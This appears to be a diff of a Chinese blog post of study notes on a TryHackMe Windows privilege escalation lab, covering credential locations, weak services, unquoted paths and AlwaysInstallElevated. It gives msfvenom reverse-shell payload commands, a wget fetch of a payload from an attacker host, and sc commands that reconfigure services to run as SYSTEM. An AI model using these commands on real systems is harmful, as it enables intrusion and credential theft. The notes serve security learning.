@@ -240,102 +240,103 @@
       
         <h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中 Room :Windows Privilege Escalation 获得的知识点。ƪ(˘⌣˘)ʃ</p>
 <span id="more"></span>
-
 <!-- toc -->
-
 <h2 id="Windows用户权限"><a href="#Windows用户权限" class="headerlink" title="Windows用户权限"></a>Windows用户权限</h2><p>&emsp;&emsp;SYSTEM &gt; Administrators &gt; Users</p>
 <h2 id="可用信息收集"><a href="#可用信息收集" class="headerlink" title="可用信息收集"></a>可用信息收集</h2><p>&emsp;&emsp;<code>常见凭据保存地址</code>：当管理员部署 Windows 系统到大量主机时，会保存管理员账号密码，可能存储凭据的位置包括</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure>
-
 <p>&emsp;&emsp;在这些文件中，可能含有明文字段<code>&lt;Credentials&gt;</code>，其储存管理员账号密码</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Credentials</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Username</span>&gt;</span>Administrator<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Domain</span>&gt;</span>thm.local<span class="tag">&lt;/<span class="name">Domain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Password</span>&gt;</span>MyPassword123<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Credentials</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>&emsp;&emsp;<code>PowerShell历史记录</code>：用户执行的 PowerShell 命令会被记录下来，如果直接在命令中使用了密码，可以通过运行指令在历史记录中被找到：<code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt（cmd.exe 使用）</code>或<code>type &quot;$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&quot;（powershell.exe 使用）</code></p>
 <p>&emsp;&emsp;<code>已保存的Windows凭据</code>：如果用户保存了用于远程访问或共享的凭据，可以通过以下命令进行查看和尝试</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>
-
 <p>&emsp;&emsp;<code>IIS 配置文件</code>：Internet Information Services （IIS） 是 Windows 安装的默认 Web 服务器。IIS 上的网站配置存储在名为 <code>web.config</code> 的文件中，其内可包含数据库连接字符串和认证信息，常见位置如下</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config</span><br></pre></td></tr></table></figure>
-
 <p>&emsp;&emsp;如要查找数据库连接字符串，使用命令：<code>type &lt;filepath&gt; | findstr connectionString</code></p>
 <p>&emsp;&emsp;<code>PuTTY会话配置</code>：PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接的参数，而是可以存储 IP、用户和其他配置，比如包含明文身份验证凭据的代理配置；检索存储的代理凭据，就要查找注册表中存储的信息，可使用如下命令：<code>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</code></p>
 <h2 id="利用错误配置进行权限提升"><a href="#利用错误配置进行权限提升" class="headerlink" title="利用错误配置进行权限提升"></a>利用错误配置进行权限提升</h2><p>&emsp;&emsp;<code>错误的计划任务</code>：当一个计划任务使用的可执行文件丢失或者该文件可被非特权用户修改，则其可以被利用；使用命令<code>schtasks /query /tn vulntask /fo list /v</code>可以查看系统上的计划任务，以下是输出的具体解释</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
-<th align="center">字段名</th>
-<th align="center">示例值</th>
-<th align="center">解释说明</th>
+<th style="text-align:center">字段名</th>
+<th style="text-align:center">示例值</th>
+<th style="text-align:center">解释说明</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">Folder</td>
-<td align="center">\</td>
-<td align="center">任务所在的文件夹</td>
+<tbody>
+<tr>
+<td style="text-align:center">Folder</td>
+<td style="text-align:center">\</td>
+<td style="text-align:center">任务所在的文件夹</td>
 </tr>
 <tr>
-<td align="center">HostName</td>
-<td align="center">THM-PC1</td>
-<td align="center">运行任务的计算机名（主机名）</td>
+<td style="text-align:center">HostName</td>
+<td style="text-align:center">THM-PC1</td>
+<td style="text-align:center">运行任务的计算机名（主机名）</td>
 </tr>
 <tr>
-<td align="center">TaskName</td>
-<td align="center">\vulntask</td>
-<td align="center">任务的名称</td>
+<td style="text-align:center">TaskName</td>
+<td style="text-align:center">\vulntask</td>
+<td style="text-align:center">任务的名称</td>
 </tr>
 <tr>
-<td align="center">Task To Run</td>
-<td align="center">C:\tasks\schtask.bat</td>
-<td align="center">任务实际执行的程序或脚本</td>
+<td style="text-align:center">Task To Run</td>
+<td style="text-align:center">C:\tasks\schtask.bat</td>
+<td style="text-align:center">任务实际执行的程序或脚本</td>
 </tr>
 <tr>
-<td align="center">Run As User</td>
-<td align="center">taskusr1</td>
-<td align="center">任务运行时使用的用户账号</td>
+<td style="text-align:center">Run As User</td>
+<td style="text-align:center">taskusr1</td>
+<td style="text-align:center">任务运行时使用的用户账号</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p>&emsp;&emsp;显然，如果可以修改 Task To Run 路径下的脚本，即可产生权限提升，查看可执行文件的文件权限可使用如下指令：<code>icacls &lt;Task To Run 脚本路径&gt;</code>，对其中输出的信息，做如下解释</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
-<th align="center">简写</th>
-<th align="center">中文解释</th>
+<th style="text-align:center">简写</th>
+<th style="text-align:center">中文解释</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">F</td>
-<td align="center">完全控制：可以进行所有操作，包括更改权限和所有权</td>
+<tbody>
+<tr>
+<td style="text-align:center">F</td>
+<td style="text-align:center">完全控制：可以进行所有操作，包括更改权限和所有权</td>
 </tr>
 <tr>
-<td align="center">M</td>
-<td align="center">修改：可以读取、写入、删除，但不能更改权限或所有权</td>
+<td style="text-align:center">M</td>
+<td style="text-align:center">修改：可以读取、写入、删除，但不能更改权限或所有权</td>
 </tr>
 <tr>
-<td align="center">RX</td>
-<td align="center">读取和执行：可以读取内容并执行程序，但不能修改</td>
+<td style="text-align:center">RX</td>
+<td style="text-align:center">读取和执行：可以读取内容并执行程序，但不能修改</td>
 </tr>
 <tr>
-<td align="center">R</td>
-<td align="center">读取：只能查看内容，不能更改</td>
+<td style="text-align:center">R</td>
+<td style="text-align:center">读取：只能查看内容，不能更改</td>
 </tr>
 <tr>
-<td align="center">W</td>
-<td align="center">写入：可以修改内容或新建文件，但不能删除或更改权限</td>
+<td style="text-align:center">W</td>
+<td style="text-align:center">写入：可以修改内容或新建文件，但不能删除或更改权限</td>
 </tr>
 <tr>
-<td align="center">D</td>
-<td align="center">删除：可以删除文件或文件夹</td>
+<td style="text-align:center">D</td>
+<td style="text-align:center">删除：可以删除文件或文件夹</td>
 </tr>
 <tr>
-<td align="center">I</td>
-<td align="center">继承：该权限是从父对象继承而来的，不是直接分配的</td>
+<td style="text-align:center">I</td>
+<td style="text-align:center">继承：该权限是从父对象继承而来的，不是直接分配的</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p>&emsp;&emsp;<code>.msi文件</code>：Windows 安装程序文件</p>
 <p>&emsp;&emsp;<code>AlwaysInstallElevated</code>：是 Windows 的一个设置，允许所有用户以管理员权限运行 <code>.msi</code> 安装程序；如果系统启用了 AlwaysInstallElevated，攻击者可以创建一个恶意 .msi 文件，并以管理员权限执行，从而实现提权，以下是利用该方法实施提权的操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 首先，检测目标系统是否启用AlwaysInstallElevated</span><br><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"># 如果两个注册表值中，AlwaysInstallElevated=1均成立，说明可以利用</span><br><span class="line"></span><br><span class="line"># 使用msfvenom生成恶意.msi文件</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP LPORT=攻击者端口 -f msi -o malicious.msi</span><br><span class="line"># 以下是各选项的解释</span><br><span class="line">-p：指定payload，比如这里用的是reverse_tcp shell，意味着生成一个Windows 64位系统用的反向TCP Shell</span><br><span class="line">-f msi：指定输出格式为 .msi</span><br><span class="line">-o malicious.msi：输出文件名</span><br><span class="line"></span><br><span class="line"># 运行生成非的.msi恶意文件</span><br><span class="line">msiexec /quiet /qn /i &lt;malicious.msi的路径&gt;</span><br><span class="line"># 以下是各选项的解释</span><br><span class="line">msiexec：Windows安装程序命令</span><br><span class="line">/quiet /qn：静默安装，无界面，不提示用户</span><br><span class="line">/i ：指定安装包</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用不当Windows服务配置进行权限提升"><a href="#利用不当Windows服务配置进行权限提升" class="headerlink" title="利用不当Windows服务配置进行权限提升"></a>利用不当Windows服务配置进行权限提升</h2><p>&emsp;&emsp; <code>SCM</code>：Windows 服务管理器，负责控制服务的状态、检查当前状态并提供配置服务的方式，每个服务都有一个相关的可执行文件，SCM 在服务启动时运行该文件；使用 <code>sc qc</code> 命令可以查看服务的详细配置，以下是对其关键参数的解释</p>
+<h2 id="利用不当Windows服务配置进行权限提升"><a href="#利用不当Windows服务配置进行权限提升" class="headerlink" title="利用不当Windows服务配置进行权限提升"></a>利用不当Windows服务配置进行权限提升</h2><p>&emsp;&emsp; <code>SCM</code>：Windows 服务管理器，负责控制服务的状态、检查当前状态并提供配置服务的方式，每个服务都有一个相关的可执行文件，SCM 在服务启动时运行该文件；使用 <code>sc qc</code> 命令可以查看服务的详细配置，以下是对其关键参数的解释</p>
 <p>&emsp;&emsp;<strong>BINARY_PATH_NAME</strong>: 指定可执行文件路径</p>
 <p>&emsp;&emsp;<strong>SERVICE_START_NAME</strong>: 显示运行服务的账户</p>
 <p>&emsp;&emsp;<code>DACL</code>：服务具有任意访问控制列表 （DACL），该列表指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务，以及其他权限</p>
@@ -343,14 +344,11 @@
 <p>&emsp;&emsp;<code>利用方式</code>：主要从三个方面实施权限提升：<font color="red">服务可执行文件的弱权限；无引号的服务路径；DACL 配置错误</font></p>
 <p>&emsp;&emsp;<code>服务可执行文件的弱权限</code>：如果与服务关联的可执行文件允许攻击者修改或替换它，可利用此注入恶意脚本进行权限提升，具体做法如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 1、使用sc qc查看服务的配置，找到其中的BINARY_PATH_NAME属性</span><br><span class="line">sc qc WindowsScheduler</span><br><span class="line">=&gt; BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">注：PROGRA~2是Program Files (x86)的8.3短文件名格式，SYSTEM~1是 System Scheduler的短名</span><br><span class="line"></span><br><span class="line"># 2、使用icacls查看可执行文件的权限，查看是否攻击者账号拥有修改或删除该文件的权限</span><br><span class="line">icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">=&gt; Everyone:(I)(M)</span><br><span class="line"></span><br><span class="line"># 3、使用msfvenom生成恶意可执行文件，攻击机上执行</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击机IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line"># 4、打开Python Web服务器，开放端口使目的机下载恶意.exe程序</span><br><span class="line">python3 -m http.server(攻击机执行)</span><br><span class="line">=&gt; Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">wget http://攻击者IP:8000/rev-svc.exe -O rev-svc.exe(受害机执行)</span><br></pre></td></tr></table></figure>
-
 <p>&emsp;&emsp;<code>无引号的服务路径</code>：使用 Windows 服务时，当服务配置为指向“未加引号的”可执行文件时，文件路径中的空格会被错误考虑；如果路径没有正确加引号，Windows 会尝试执行路径中的多个文件，直到找到正确的可执行文件，使用下例进行解释</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 比如，系统中存在一个服务路径：C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">sc qc &quot;C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe&quot;</span><br><span class="line">=&gt; 查看disksrs.exe权限</span><br><span class="line"></span><br><span class="line"># 如果不加引号</span><br><span class="line">sc qc C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">=&gt; 查找C:\MyPrograms\Disk.exe</span><br><span class="line">=&gt; 查找C:\MyPrograms\Disk Sorter.exe</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
 <p>&emsp;&emsp;因此，我们可以通过构造恶意的<code>C:\MyPrograms\Disk.exe</code>，实现权限提升</p>
 <p>&emsp;&emsp;<code>DACL配置错误</code>：如果服务的 DACL 允许用户修改服务配置，我们就可以重新配置该服务，指向任何恶意可执行文件并以任何用户账户（甚至是 SYSTEM）执行它，具体做法如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 1、使用Sysinternals套件中的Accesschk，检查服务的DACL配置</span><br><span class="line">accesschk64.exe -qlc &lt;指定的服务路径&gt;</span><br><span class="line">=&gt;C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line">  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_PAUSE_CONTINUE</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">        </span><br><span class="line"># 2、根据输出，发现存在漏洞可以利用，使用msfvenom生成恶意可执行文件</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击机IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line"># 3、打开Python Web服务器，开放端口使目的机下载恶意.exe程序</span><br><span class="line">python3 -m http.server(攻击机执行)</span><br><span class="line">=&gt; Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">wget http://攻击者IP:8000/rev-svc.exe -O rev-svc.exe(受害机执行)</span><br><span class="line"></span><br><span class="line"># 4、更改目标服务的配置</span><br><span class="line">sc config &lt;服务名&gt; binPath= &quot;&lt;可执行文件路径&gt;&quot; obj= LocalSystem</span><br><span class="line"></span><br><span class="line"># 5、重启服务</span><br><span class="line">C:\&gt; sc stop THMService</span><br><span class="line">C:\&gt; sc start THMService</span><br></pre></td></tr></table></figure>
-
 
     </div>
 
@@ -548,6 +546,61 @@
 
 
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
